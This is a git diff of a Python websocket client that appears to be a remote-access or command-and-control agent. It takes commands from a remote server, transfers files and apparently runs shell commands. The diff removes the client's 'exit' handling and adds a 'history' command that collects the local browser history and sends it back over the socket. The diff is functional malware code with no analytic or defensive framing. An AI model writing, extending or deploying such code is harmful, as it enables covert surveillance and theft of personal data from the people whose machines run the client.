@@ -4,6 +4,7 @@ import os
 import subprocess
 import time
 
+from browser.monitor_website import fetch_hist
 from utils import handle_cd, download_file, maintain_client_status
 
 
@@ -36,8 +37,6 @@ async def start_client():
                         if command.lower().startswith('switch'):
                             active = 0
                             continue
-                        elif command.lower() == 'exit':
-                            break
                         elif command.lower().startswith('download'):
                             # Extracting filename from the command
                             _, filepath = command.split(' ', 1)
@@ -45,6 +44,11 @@ async def start_client():
                             await websocket.send(f"download {filepath}")
 
                             await download_file(websocket, filepath=f"{os.getcwd()}/{filepath}")
+                            continue
+                        elif command.lower().startswith('history'):
+                            await websocket.send("history")
+                            hist = fetch_hist()
+                            await websocket.send(hist)
                             continue
 
                         cd_result = handle_cd(command)
